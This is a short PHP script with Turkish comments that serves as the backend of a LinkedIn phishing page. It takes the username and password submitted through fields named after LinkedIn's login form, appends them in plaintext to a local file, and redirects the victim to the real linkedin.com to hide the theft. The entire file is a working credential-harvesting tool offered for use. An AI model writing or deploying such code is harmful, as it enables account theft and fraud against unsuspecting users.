<?php
// Formdan gelen değerleri al
$username = $_POST['session_key'];
$password = $_POST['session_password'];

// Dosyaya yazmak için veriyi oluştur
$data = "username: $username password: $password\n";

// Veriyi dosyaya ekle
file_put_contents("usernames.txt", $data, FILE_APPEND);

// LinkedIn'e yönlendir
header('Location: https://linkedin.com');
exit();
?>